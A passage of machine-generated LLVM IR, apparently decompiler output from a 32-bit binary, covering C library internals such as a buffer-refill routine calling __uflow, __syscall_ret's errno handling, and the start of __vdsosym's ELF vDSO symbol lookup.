dec_label_pc_804fd23:                             ; preds = %entry
  %v2_804fd23 = add i32 %arg1, 120
  %v3_804fd23 = inttoptr i32 %v2_804fd23 to i32*
  %v4_804fd23 = load i32, i32* %v3_804fd23, align 4
  %v5_804fd26 = icmp slt i32 %v3_804fd17, %v4_804fd23
  br i1 %v5_804fd26, label %dec_label_pc_804fd28, label %dec_label_pc_804fd50

dec_label_pc_804fd28:                             ; preds = %dec_label_pc_804fd52, %dec_label_pc_804fd57, %dec_label_pc_804fd23
  %v0_804fd28 = phi i32 [ %arg1, %dec_label_pc_804fd23 ], [ %arg1, %dec_label_pc_804fd52 ], [ %v0_804fd28.pre, %dec_label_pc_804fd57 ]
  %v1_804fd28 = add i32 %v0_804fd28, 104
  %v2_804fd28 = inttoptr i32 %v1_804fd28 to i32*
  store i32 0, i32* %v2_804fd28, align 4
  br label %dec_label_pc_804fd37

dec_label_pc_804fd37:                             ; preds = %dec_label_pc_804fd94, %dec_label_pc_804fda3, %dec_label_pc_804fd28
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_804fd28 ], [ %v1_804fd60, %dec_label_pc_804fd94 ], [ %v1_804fd60, %dec_label_pc_804fda3 ]
  %sext4 = mul i32 %stack_var_-32.0, 16777216
  %v4_804fd37 = sdiv i32 %sext4, 16777216
  %v0_804fd4b = load i32, i32* @esp, align 4
  %v1_804fd4b = add i32 %v0_804fd4b, 60
  %v6_804fd4b = xor i32 %v0_804fd4b, -2147483648
  %v7_804fd4b = and i32 %v1_804fd4b, %v6_804fd4b
  %v8_804fd4b = icmp slt i32 %v7_804fd4b, 0
  store i1 %v8_804fd4b, i1* @of, align 1
  ret i32 %v4_804fd37

dec_label_pc_804fd50:                             ; preds = %dec_label_pc_804fd23
  %v8_804fd50 = icmp sgt i32 %v3_804fd17, %v4_804fd23
  br i1 %v8_804fd50, label %dec_label_pc_804fd57, label %dec_label_pc_804fd52

dec_label_pc_804fd52:                             ; preds = %dec_label_pc_804fd50
  %v2_804fd52 = add i32 %arg1, 116
  %v3_804fd52 = inttoptr i32 %v2_804fd52 to i32*
  %v4_804fd52 = load i32, i32* %v3_804fd52, align 4
  %tmp = icmp ugt i32 %v3_804fd1a, %v4_804fd52
  br i1 %tmp, label %dec_label_pc_804fd57, label %dec_label_pc_804fd28

dec_label_pc_804fd57:                             ; preds = %dec_label_pc_804fd52, %dec_label_pc_804fd50, %entry
  %v1_804fd60 = call i32 @__uflow(i32 %arg1)
  %v2_804fd60 = trunc i32 %v1_804fd60 to i8
  %sext = mul i32 %v1_804fd60, 16777216
  %v3_804fd65 = icmp slt i32 %sext, 0
  %v0_804fd28.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v3_804fd65, label %dec_label_pc_804fd28, label %dec_label_pc_804fd6d

dec_label_pc_804fd6d:                             ; preds = %dec_label_pc_804fd57
  %v1_804fd6d = add i32 %v0_804fd28.pre, 112
  %v2_804fd6d = inttoptr i32 %v1_804fd6d to i32*
  %v3_804fd6d = load i32, i32* %v2_804fd6d, align 4
  %v1_804fd70 = add i32 %v0_804fd28.pre, 108
  %v2_804fd70 = inttoptr i32 %v1_804fd70 to i32*
  %v3_804fd70 = load i32, i32* %v2_804fd70, align 4
  %v2_804fd75 = or i32 %v3_804fd70, %v3_804fd6d
  %v3_804fd75 = icmp eq i32 %v2_804fd75, 0
  %v1_804fd77 = icmp eq i1 %v3_804fd75, false
  br i1 %v1_804fd77, label %dec_label_pc_804fdb0, label %dec_label_pc_804fd79

dec_label_pc_804fd79:                             ; preds = %dec_label_pc_804fd6d
  %v1_804fd79 = add i32 %v0_804fd28.pre, 8
  %v2_804fd79 = inttoptr i32 %v1_804fd79 to i32*
  %v3_804fd79 = load i32, i32* %v2_804fd79, align 4
  store i32 %v3_804fd79, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804fd7c

dec_label_pc_804fd7c:                             ; preds = %dec_label_pc_804fdf5, %dec_label_pc_804fdb0, %dec_label_pc_804fd79
  %v0_804fd7c = phi i32 [ %v3_804fdb8, %dec_label_pc_804fdb0 ], [ %v3_804fdb8, %dec_label_pc_804fdf5 ], [ %v3_804fd79, %dec_label_pc_804fd79 ]
  %v2_804fd7c = add i32 %v0_804fd28.pre, 104
  %v3_804fd7c = inttoptr i32 %v2_804fd7c to i32*
  store i32 %v0_804fd7c, i32* %v3_804fd7c, align 4
  br label %dec_label_pc_804fd7f

dec_label_pc_804fd7f:                             ; preds = %dec_label_pc_804fdfb, %dec_label_pc_804fd7c
  %v0_804fd7f = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fd7f = icmp eq i32 %v0_804fd7f, 0
  br i1 %v1_804fd7f, label %dec_label_pc_804fd94, label %dec_label_pc_804fd83

dec_label_pc_804fd83:                             ; preds = %dec_label_pc_804fd7f
  %v1_804fd83 = add i32 %v0_804fd7f, 1
  %v1_804fd86 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fd86 = add i32 %v1_804fd86, 4
  %v3_804fd86 = inttoptr i32 %v2_804fd86 to i32*
  %v4_804fd86 = load i32, i32* %v3_804fd86, align 4
  %v5_804fd86 = sub i32 %v1_804fd83, %v4_804fd86
  %v2_804fd8b = ashr i32 %v5_804fd86, 31
  store i32 %v2_804fd8b, i32* %edx.global-to-local, align 4
  %v1_804fd8e = add i32 %v1_804fd86, 116
  %v2_804fd8e = inttoptr i32 %v1_804fd8e to i32*
  %v3_804fd8e = load i32, i32* %v2_804fd8e, align 4
  %v5_804fd8e = add i32 %v3_804fd8e, %v5_804fd86
  %v10_804fd8e = icmp ult i32 %v5_804fd8e, %v3_804fd8e
  store i32 %v5_804fd8e, i32* %v2_804fd8e, align 4
  %v0_804fd91 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd91 = add i32 %v0_804fd91, 120
  %v2_804fd91 = inttoptr i32 %v1_804fd91 to i32*
  %v3_804fd91 = load i32, i32* %v2_804fd91, align 4
  %v4_804fd91 = load i32, i32* %edx.global-to-local, align 4
  %v6_804fd91 = zext i1 %v10_804fd8e to i32
  %v7_804fd91 = add i32 %v4_804fd91, %v3_804fd91
  %v8_804fd91 = add i32 %v7_804fd91, %v6_804fd91
  store i32 %v8_804fd91, i32* %v2_804fd91, align 4
  br label %dec_label_pc_804fd94

dec_label_pc_804fd94:                             ; preds = %dec_label_pc_804fd7f, %dec_label_pc_804fd83
  %v0_804fd94 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd94 = add i32 %v0_804fd94, 4
  %v2_804fd94 = inttoptr i32 %v1_804fd94 to i32*
  %v3_804fd94 = load i32, i32* %v2_804fd94, align 4
  %v1_804fd97 = add i32 %v3_804fd94, -1
  store i32 %v1_804fd97, i32* %edx.global-to-local, align 4
  %v1_804fd9a = inttoptr i32 %v1_804fd97 to i8*
  %v2_804fd9a = load i8, i8* %v1_804fd9a, align 1
  %v3_804fd9a = zext i8 %v2_804fd9a to i32
  %v4_804fd9d = sdiv i32 %sext, 16777216
  %v16_804fd9d = icmp eq i32 %v4_804fd9d, %v3_804fd9a
  br i1 %v16_804fd9d, label %dec_label_pc_804fd37, label %dec_label_pc_804fda3

dec_label_pc_804fda3:                             ; preds = %dec_label_pc_804fd94
  store i8 %v2_804fd60, i8* %v1_804fd9a, align 1
  br label %dec_label_pc_804fd37

dec_label_pc_804fdb0:                             ; preds = %dec_label_pc_804fd6d
  %v1_804fdb0 = add i32 %v0_804fd28.pre, 4
  %v2_804fdb0 = inttoptr i32 %v1_804fdb0 to i32*
  %v3_804fdb0 = load i32, i32* %v2_804fdb0, align 4
  store i32 %v3_804fdb0, i32* %edx.global-to-local, align 4
  %v1_804fdb5 = add i32 %v0_804fd28.pre, 116
  %v2_804fdb5 = inttoptr i32 %v1_804fdb5 to i32*
  %v3_804fdb5 = load i32, i32* %v2_804fdb5, align 4
  %v1_804fdb8 = add i32 %v0_804fd28.pre, 8
  %v2_804fdb8 = inttoptr i32 %v1_804fdb8 to i32*
  %v3_804fdb8 = load i32, i32* %v2_804fdb8, align 4
  store i32 %v3_804fdb8, i32* %ebp.global-to-local, align 4
  %v1_804fdbf = add i32 %v0_804fd28.pre, 120
  %v2_804fdbf = inttoptr i32 %v1_804fdbf to i32*
  %v3_804fdbf = load i32, i32* %v2_804fdbf, align 4
  %v5_804fdc8 = sub i32 %v3_804fdb8, %v3_804fdb0
  %v2_804fdd2 = ashr i32 %v5_804fdc8, 31
  %v5_804fddb = sub i32 %v3_804fd70, %v3_804fdb5
  %v10_804fddb = icmp ult i32 %v3_804fd70, %v3_804fdb5
  %v6_804fddf = zext i1 %v10_804fddb to i32
  %v1_804fde7 = add i32 %v5_804fddb, -1
  %v4_804fde7 = icmp ne i32 %v5_804fddb, 0
  store i32 %v1_804fde7, i32* %edx.global-to-local, align 4
  %v2_804fdea = zext i1 %v4_804fde7 to i32
  %v7_804fddf = add i32 %v3_804fd6d, -1
  %v8_804fddf = add i32 %v7_804fddf, %v6_804fddf
  %v3_804fdea = add i32 %v8_804fddf, %v2_804fdea
  %v4_804fdea = sub i32 %v3_804fdea, %v3_804fdbf
  %v5_804fded = sub i32 %v2_804fdd2, %v4_804fdea
  %v11_804fded = xor i32 %v4_804fdea, %v2_804fdd2
  %v12_804fded = xor i32 %v5_804fded, %v2_804fdd2
  %v13_804fded = and i32 %v12_804fded, %v11_804fded
  %v14_804fded = icmp slt i32 %v13_804fded, 0
  %v16_804fded = icmp slt i32 %v5_804fded, 0
  %v2_804fdf1 = icmp eq i1 %v16_804fded, %v14_804fded
  br i1 %v2_804fdf1, label %dec_label_pc_804fdf3, label %dec_label_pc_804fd7c

dec_label_pc_804fdf3:                             ; preds = %dec_label_pc_804fdb0
  %v15_804fded = icmp eq i32 %v5_804fded, 0
  %v4_804fdf3 = icmp eq i1 %v15_804fded, false
  br i1 %v4_804fdf3, label %dec_label_pc_804fdfb, label %dec_label_pc_804fdf5

dec_label_pc_804fdf5:                             ; preds = %dec_label_pc_804fdf3
  %tmp20 = icmp ugt i32 %v5_804fdc8, %v1_804fde7
  br i1 %tmp20, label %dec_label_pc_804fdfb, label %dec_label_pc_804fd7c

dec_label_pc_804fdfb:                             ; preds = %dec_label_pc_804fdf5, %dec_label_pc_804fdf3
  %v2_804fe05 = add i32 %v3_804fdb0, -1
  %v3_804fe05 = add i32 %v2_804fe05, %v5_804fddb
  %v2_804fe09 = add i32 %v0_804fd28.pre, 104
  %v3_804fe09 = inttoptr i32 %v2_804fe09 to i32*
  store i32 %v3_804fe05, i32* %v3_804fe09, align 4
  br label %dec_label_pc_804fd7f

; uselistorder directives
  uselistorder i32 %v5_804fded, { 2, 1, 0 }
  uselistorder i32 %v4_804fdea, { 1, 0 }
  uselistorder i32 %v5_804fddb, { 0, 2, 1 }
  uselistorder i32 %v3_804fdb8, { 2, 3, 1, 0 }
  uselistorder i32 %v3_804fdb5, { 1, 0 }
  uselistorder i32 %v3_804fd8e, { 1, 0 }
  uselistorder i32 %v3_804fd70, { 1, 2, 0 }
  uselistorder i32 %v0_804fd28.pre, { 0, 9, 7, 8, 6, 1, 5, 4, 3, 2 }
  uselistorder i32 %v1_804fd60, { 0, 3, 2, 1 }
  uselistorder i32 %v4_804fd23, { 1, 0 }
  uselistorder i32 %v3_804fd17, { 1, 2, 0, 3 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @__uflow, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder label %dec_label_pc_804fd94, { 1, 0 }
  uselistorder label %dec_label_pc_804fd37, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd28, { 1, 0, 2 }
}

define i32 @__syscall_ret(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fe20 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v6_804fe30 = icmp ugt i32 %arg1, -4096
  br i1 %v6_804fe30, label %dec_label_pc_804fe37, label %dec_label_pc_804fe32

dec_label_pc_804fe32:                             ; preds = %entry, %dec_label_pc_804fe37
  %v0_804fe36 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_804fe37 ]
  store i32 %v0_804fe20, i32* @ebx, align 4
  ret i32 %v0_804fe36

dec_label_pc_804fe37:                             ; preds = %entry
  %v1_804fe37 = call i32 @__errno_location(i32 %v0_804fe20)
  %v0_804fe3c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe3c = sub i32 0, %v0_804fe3c
  store i32 %v1_804fe3c, i32* %ebx.global-to-local, align 4
  %v2_804fe3e = inttoptr i32 %v1_804fe37 to i32*
  store i32 %v1_804fe3c, i32* %v2_804fe3e, align 4
  br label %dec_label_pc_804fe32

; uselistorder directives
  uselistorder i32 %v0_804fe20, { 1, 0 }
  uselistorder i32 -4096, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804fe32, { 1, 0 }
}

define i32 @__vdsosym(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804fe59 = load i32, i32* @global_var_8056f90.321, align 16
  %v1_804fe5f = inttoptr i32 %v0_804fe59 to i32*
  %v2_804fe5f = load i32, i32* %v1_804fe5f, align 4
  %v9_804fe61 = icmp eq i32 %v2_804fe5f, 33
  br i1 %v9_804fe61, label %dec_label_pc_804fe84, label %dec_label_pc_804fe66

dec_label_pc_804fe66:                             ; preds = %entry
  %v1_804fe66 = icmp eq i32 %v2_804fe5f, 0
  %v1_804fe6a = icmp eq i1 %v1_804fe66, false
  br i1 %v1_804fe6a, label %dec_label_pc_804fe7c, label %dec_label_pc_804ff58

dec_label_pc_804fe71:                             ; preds = %dec_label_pc_804fe7c
  %v1_804fe71 = add i32 %v0_804fe71, 8
  %v1_804fe74 = icmp eq i32 %v4_804fe7c, 0
  br i1 %v1_804fe74, label %dec_label_pc_804ff58.loopexit4, label %dec_label_pc_804fe7c

dec_label_pc_804fe7c:                             ; preds = %dec_label_pc_804fe66, %dec_label_pc_804fe71
  %v0_804fe71 = phi i32 [ %v1_804fe71, %dec_label_pc_804fe71 ], [ 8, %dec_label_pc_804fe66 ]
  %v2_804fe7c = add i32 %v0_804fe71, %v0_804fe59
  %v3_804fe7c = inttoptr i32 %v2_804fe7c to i32*
  %v4_804fe7c = load i32, i32* %v3_804fe7c, align 4
  %v9_804fe7f = icmp eq i32 %v4_804fe7c, 33
  %v1_804fe82 = icmp eq i1 %v9_804fe7f, false
  br i1 %v1_804fe82, label %dec_label_pc_804fe71, label %dec_label_pc_804fe84.loopexit

dec_label_pc_804fe84.loopexit:                    ; preds = %dec_label_pc_804fe7c
  br label %dec_label_pc_804fe84

dec_label_pc_804fe84:                             ; preds = %dec_label_pc_804fe84.loopexit, %entry
  %v0_804fe84 = phi i32 [ %v0_804fe71, %dec_label_pc_804fe84.loopexit ], [ 0, %entry ]
  %v2_804fe84 = or i32 %v0_804fe84, 4
  %v3_804fe84 = add i32 %v2_804fe84, %v0_804fe59
  %v4_804fe84 = inttoptr i32 %v3_804fe84 to i32*
  %v5_804fe84 = load i32, i32* %v4_804fe84, align 4
  store i32 %v5_804fe84, i32* %ebx.global-to-local, align 4
  %v1_804fe88 = add i32 %v5_804fe84, 44
  %v2_804fe88 = inttoptr i32 %v1_804fe88 to i16*
  %v3_804fe88 = load i16, i16* %v2_804fe88, align 2
  %v4_804fe88 = zext i16 %v3_804fe88 to i32
  %v4_804fe8f = icmp eq i16 %v3_804fe88, 0
  br i1 %v4_804fe8f, label %dec_label_pc_804ff58, label %dec_label_pc_804fe9b

dec_label_pc_804fe9b:                             ; preds = %dec_label_pc_804fe84
  %v1_804fe8c = add i32 %v5_804fe84, 28
  %v2_804fe8c = inttoptr i32 %v1_804fe8c to i32*
  %v3_804fe8c = load i32, i32* %v2_804fe8c, align 4
  %v1_804fe9b = add i32 %v5_804fe84, 42
  %v2_804fe9b = inttoptr i32 %v1_804fe9b to i16*
  %v3_804fe9b = load i16, i16* %v2_804fe9b, align 2
  %v4_804fe9b = zext i16 %v3_804fe9b to i32
  store i32 %v4_804fe9b, i32* %esi.global-to-local, align 4
  %v2_804fe9f = add i32 %v3_804fe8c, %v5_804fe84
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804fec2

dec_label_pc_804feb0:                             ; preds = %dec_label_pc_804fec2
  %v9_804feb0 = icmp eq i32 %v2_804fec2, 2
  br i1 %v9_804feb0, label %dec_label_pc_804ff62, label %dec_label_pc_804feb9

dec_label_pc_804feb9:                             ; preds = %dec_label_pc_804feb0, %dec_label_pc_804ff62
  %v0_804fedc27 = phi i32 [ %v0_804fedc28, %dec_label_pc_804feb0 ], [ %v5_804ff64, %dec_label_pc_804ff62 ]
  %v1_804feb9 = add i32 %v0_804feb9, 1
  %v12_804febc = icmp eq i32 %v1_804feb9, %v4_804fe88
  br i1 %v12_804febc, label %dec_label_pc_804fedc, label %dec_label_pc_804fec0

dec_label_pc_804fec0:                             ; preds = %dec_label_pc_804fec9, %dec_label_pc_804feb9
  %v0_804fedc26 = phi i32 [ %v0_804fedc27, %dec_label_pc_804feb9 ], [ %v0_804fedc28, %dec_label_pc_804fec9 ]
  %v0_804fecc18 = phi i32 [ %v1_804feb9, %dec_label_pc_804feb9 ], [ %v1_804fecc, %dec_label_pc_804fec9 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804feb9 ], [ %v2_804fed2, %dec_label_pc_804fec9 ]
  %v2_804fec0 = add i32 %v0_804fec0, %v4_804fe9b
  br label %dec_label_pc_804fec2

dec_label_pc_804fec2:                             ; preds = %dec_label_pc_804fe9b, %dec_label_pc_804fec0
  %v0_804fedc28 = phi i32 [ 0, %dec_label_pc_804fe9b ], [ %v0_804fedc26, %dec_label_pc_804fec0 ]
  %v0_804feb9 = phi i32 [ 0, %dec_label_pc_804fe9b ], [ %v0_804fecc18, %dec_label_pc_804fec0 ]
  %v0_804fec0 = phi i32 [ %v2_804fe9f, %dec_label_pc_804fe9b ], [ %v2_804fec0, %dec_label_pc_804fec0 ]
  %stack_var_-32.1 = phi i32 [ -1, %dec_label_pc_804fe9b ], [ %stack_var_-32.0, %dec_label_pc_804fec0 ]
  %v1_804fec2 = inttoptr i32 %v0_804fec0 to i32*
  %v2_804fec2 = load i32, i32* %v1_804fec2, align 4
  %v9_804fec4 = icmp eq i32 %v2_804fec2, 1
  %v1_804fec7 = icmp eq i1 %v9_804fec4, false
  br i1 %v1_804fec7, label %dec_label_pc_804feb0, label %dec_label_pc_804fec9

dec_label_pc_804fec9:                             ; preds = %dec_label_pc_804fec2
  %v1_804fec9 = add i32 %v0_804fec0, 4
  %v2_804fec9 = inttoptr i32 %v1_804fec9 to i32*
  %v3_804fec9 = load i32, i32* %v2_804fec9, align 4
  %v1_804fecc = add i32 %v0_804feb9, 1
  %v2_804fecf = add i32 %v0_804fec0, 8
  %v3_804fecf = inttoptr i32 %v2_804fecf to i32*
  %v4_804fecf = load i32, i32* %v3_804fecf, align 4
  %v5_804fecf = sub i32 %v3_804fec9, %v4_804fecf
  %v2_804fed2 = add i32 %v5_804fecf, %v5_804fe84
  %v12_804fed4 = icmp eq i32 %v1_804fecc, %v4_804fe88
  %v1_804feda = icmp eq i1 %v12_804fed4, false
  br i1 %v1_804feda, label %dec_label_pc_804fec0, label %dec_label_pc_804fedc

dec_label_pc_804fedc:                             ; preds = %dec_label_pc_804fec9, %dec_label_pc_804feb9
  %v0_804feee = phi i32 [ %v0_804fedc27, %dec_label_pc_804feb9 ], [ %v0_804fedc28, %dec_label_pc_804fec9 ]
  %stack_var_-32.2 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804feb9 ], [ %v2_804fed2, %dec_label_pc_804fec9 ]
  %v1_804fedc = icmp eq i32 %v0_804feee, 0
  br i1 %v1_804fedc, label %dec_label_pc_804ff58, label %dec_label_pc_804fee0

dec_label_pc_804fee0:                             ; preds = %dec_label_pc_804fedc
  %v13_804fee0 = icmp eq i32 %stack_var_-32.2, -1
  br i1 %v13_804fee0, label %dec_label_pc_804ff58, label %dec_label_pc_804fee7

dec_label_pc_804fee7:                             ; preds = %dec_label_pc_804fee0
  %v1_804fee7 = inttoptr i32 %v0_804feee to i32*
  %v2_804fee7 = load i32, i32* %v1_804fee7, align 4
  %v1_804feea = icmp eq i32 %v2_804fee7, 0
  br i1 %v1_804feea, label %dec_label_pc_804ff58, label %dec_label_pc_804feee

dec_label_pc_804feee:                             ; preds = %dec_label_pc_804fee7
  %v1_804feee = add i32 %v0_804feee, 4
  store i32 %v1_804feee, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ff30

dec_label_pc_804ff16:                             ; preds = %dec_label_pc_804ff3c
  %v9_804ff16 = icmp eq i32 %v0_804ff1b, 4
  br i1 %v9_804ff16, label %dec_label_pc_804ff6c, label %dec_label_pc_804ff1b

dec_label_pc_804ff1b:                             ; preds = %dec_label_pc_804ff16
  %v9_804ff1b = icmp eq i32 %v0_804ff1b, 5
  %v1_804ff1e = icmp eq i1 %v9_804ff1b, false
  %stack_var_-28.1.v0_804ff20 = select i1 %v1_804ff1e, i32 %stack_var_-28.1, i32 %v5_804ff33
  br label %dec_label_pc_804ff24

dec_label_pc_804ff24:                             ; preds = %dec_label_pc_804ff3e, %dec_label_pc_804ff45, %dec_label_pc_804ff1b, %dec_label_pc_804ff76, %dec_label_pc_804ff6c
  %v0_804ff8f = phi i32 [ %v0_804ff8636, %dec_label_pc_804ff76 ], [ %v5_804ff33, %dec_label_pc_804ff6c ], [ %v0_804ff8636, %dec_label_pc_804ff1b ], [ %v0_804ff8636, %dec_label_pc_804ff45 ], [ %v0_804ff8636, %dec_label_pc_804ff3e ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1, %dec_label_pc_804ff76 ], [ %stack_var_-24.1, %dec_label_pc_804ff6c ], [ %stack_var_-24.1, %dec_label_pc_804ff1b ], [ %stack_var_-24.1, %dec_label_pc_804ff45 ], [ %v5_804ff33, %dec_label_pc_804ff3e ]
  %v0_804ffa1 = phi i32 [ %v5_804ff33, %dec_label_pc_804ff76 ], [ %v0_804ff8234, %dec_label_pc_804ff6c ], [ %v0_804ff8234, %dec_label_pc_804ff1b ], [ %v0_804ff8234, %dec_label_pc_804ff45 ], [ %v0_804ff8234, %dec_label_pc_804ff3e ]
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1, %dec_label_pc_804ff76 ], [ %stack_var_-20.1, %dec_label_pc_804ff6c ], [ %stack_var_-20.1, %dec_label_pc_804ff1b ], [ %stack_var_-20.1.v0_804ff52, %dec_label_pc_804ff45 ], [ %stack_var_-20.1, %dec_label_pc_804ff3e ]
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804ff76 ], [ %stack_var_-28.1, %dec_label_pc_804ff6c ], [ %stack_var_-28.1.v0_804ff20, %dec_label_pc_804ff1b ], [ %stack_var_-28.1, %dec_label_pc_804ff45 ], [ %stack_var_-28.1, %dec_label_pc_804ff3e ]
  %v2_804ff24 = add i32 %v0_804ff29, %v0_804feee
  %v3_804ff24 = inttoptr i32 %v2_804ff24 to i32*
  %v4_804ff24 = load i32, i32* %v3_804ff24, align 4
  %v1_804ff29 = add i32 %v0_804ff29, 8
  %v1_804ff2c = icmp eq i32 %v4_804ff24, 0
  br i1 %v1_804ff2c, label %dec_label_pc_804ff7a, label %dec_label_pc_804ff30

dec_label_pc_804ff30:                             ; preds = %dec_label_pc_804ff24, %dec_label_pc_804feee
  %v0_804ff8636 = phi i32 [ 0, %dec_label_pc_804feee ], [ %v0_804ff8f, %dec_label_pc_804ff24 ]
  %v0_804ff8234 = phi i32 [ 0, %dec_label_pc_804feee ], [ %v0_804ffa1, %dec_label_pc_804ff24 ]
  %v0_804ff30 = phi i32 [ 0, %dec_label_pc_804feee ], [ %v0_804ff29, %dec_label_pc_804ff24 ]
  %v0_804ff29 = phi i32 [ 8, %dec_label_pc_804feee ], [ %v1_804ff29, %dec_label_pc_804ff24 ]
  %v0_804ff1b = phi i32 [ %v2_804fee7, %dec_label_pc_804feee ], [ %v4_804ff24, %dec_label_pc_804ff24 ]
  %stack_var_-20.1 = phi i32 [ 0, %dec_label_pc_804feee ], [ %stack_var_-20.0, %dec_label_pc_804ff24 ]
  %stack_var_-24.1 = phi i32 [ 0, %dec_label_pc_804feee ], [ %stack_var_-24.0, %dec_label_pc_804ff24 ]
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_804feee ], [ %stack_var_-28.0, %dec_label_pc_804ff24 ]
  %v2_804ff30 = add i32 %v0_804ff30, %v1_804feee
  %v3_804ff30 = inttoptr i32 %v2_804ff30 to i32*
  %v4_804ff30 = load i32, i32* %v3_804ff30, align 4
  %v5_804ff33 = add i32 %v4_804ff30, %stack_var_-32.2
  %v9_804ff37 = icmp eq i32 %v0_804ff1b, 6
  br i1 %v9_804ff37, label %dec_label_pc_804ff76, label %dec_label_pc_804ff3c

dec_label_pc_804ff3c:                             ; preds = %dec_label_pc_804ff30
  %tmp57 = icmp ult i32 %v0_804ff1b, 7
  br i1 %tmp57, label %dec_label_pc_804ff16, label %dec_label_pc_804ff3e

dec_label_pc_804ff3e:                             ; preds = %dec_label_pc_804ff3c
  %v6_804ff3e = icmp eq i32 %v0_804ff1b, 1879048176
  br i1 %v6_804ff3e, label %dec_label_pc_804ff24, label %dec_label_pc_804ff45

dec_label_pc_804ff45:                             ; preds = %dec_label_pc_804ff3e
  %v9_804ff45 = icmp eq i32 %v0_804ff1b, 1879048188
  %v1_804ff50 = icmp eq i1 %v9_804ff45, false
  %stack_var_-20.1.v0_804ff52 = select i1 %v1_804ff50, i32 %stack_var_-20.1, i32 %v5_804ff33
  br label %dec_label_pc_804ff24

dec_label_pc_804ff58.loopexit4:                   ; preds = %dec_label_pc_804fe71
  br label %dec_label_pc_804ff58

dec_label_pc_804ff58:                             ; preds = %dec_label_pc_804ffa7, %dec_label_pc_804ff58.loopexit4, %dec_label_pc_804fe66, %dec_label_pc_804ff8a, %dec_label_pc_804ff86, %dec_label_pc_804ff82, %dec_label_pc_804ff7a, %dec_label_pc_804fee7, %dec_label_pc_804fee0, %dec_label_pc_804fedc, %dec_label_pc_804fe84
  br label %dec_label_pc_804ff5a

dec_label_pc_804ff5a:                             ; preds = %dec_label_pc_8050051, %dec_label_pc_804ff58
  %storemerge = phi i32 [ 0, %dec_label_pc_804ff58 ], [ %v5_8050055, %dec_label_pc_8050051 ]
  ret i32 %storemerge

dec_label_pc_804ff62:                             ; preds = %dec_label_pc_804feb0
  store i32 %v5_804fe84, i32* %ebp.global-to-local, align 4
  %v2_804ff64 = add i32 %v0_804fec0, 4
  %v3_804ff64 = inttoptr i32 %v2_804ff64 to i32*
  %v4_804ff64 = load i32, i32* %v3_804ff64, align 4
  %v5_804ff64 = add i32 %v4_804ff64, %v5_804fe84
  store i32 %v5_804ff64, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804feb9

dec_label_pc_804ff6c:                             ; preds = %dec_label_pc_804ff16
  store i32 %v5_804ff33, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ff24

dec_label_pc_804ff76:                             ; preds = %dec_label_pc_804ff30
  br label %dec_label_pc_804ff24

dec_label_pc_804ff7a:                             ; preds = %dec_label_pc_804ff24
  %v1_804ff7e = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v1_804ff7e, label %dec_label_pc_804ff58, label %dec_label_pc_804ff82

dec_label_pc_804ff82:                             ; preds = %dec_label_pc_804ff7a
  %v1_804ff82 = icmp eq i32 %v0_804ffa1, 0
  br i1 %v1_804ff82, label %dec_label_pc_804ff58, label %dec_label_pc_804ff86

dec_label_pc_804ff86:                             ; preds = %dec_label_pc_804ff82
  %v1_804ff86 = icmp eq i32 %v0_804ff8f, 0
  br i1 %v1_804ff86, label %dec_label_pc_804ff58, label %dec_label_pc_804ff8a

dec_label_pc_804ff8a:                             ; preds = %dec_label_pc_804ff86
  %v8_804ff8a = icmp eq i32 %stack_var_-20.0, 0
  %v1_804ff8f = add i32 %v0_804ff8f, 4
  %v2_804ff8f = inttoptr i32 %v1_804ff8f to i32*
  %v3_804ff8f = load i32, i32* %v2_804ff8f, align 4
  store i32 %v1_804ff8f, i32* %ebp.global-to-local, align 4
  %tmp = sext i1 %v8_804ff8a to i32
  %v1_804ff97 = add nsw i32 %tmp, -1
  %v5_804ff99 = and i32 %stack_var_-24.0, %v1_804ff97
  %v6_804ff99 = icmp eq i32 %v5_804ff99, 0
  %v1_804ff9d = icmp eq i32 %v3_804ff8f, 0
  br i1 %v1_804ff9d, label %dec_label_pc_804ff58, label %dec_label_pc_804ffa1

dec_label_pc_804ffa1:                             ; preds = %dec_label_pc_804ff8a
  store i32 %v0_804ffa1, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v4_804ffeb = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_804ffb2

dec_label_pc_804ffa7:                             ; preds = %dec_label_pc_8050013, %bb60.thread, %dec_label_pc_805002f, %dec_label_pc_804ffdd, %dec_label_pc_804ffd6, %bb60, %bb58
  %v0_804ffa7 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ffa7 = add i32 %v0_804ffa7, 1
  store i32 %v1_804ffa7, i32* %esi.global-to-local, align 4
  %v0_804ffaa = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ffaa = add i32 %v0_804ffaa, 16
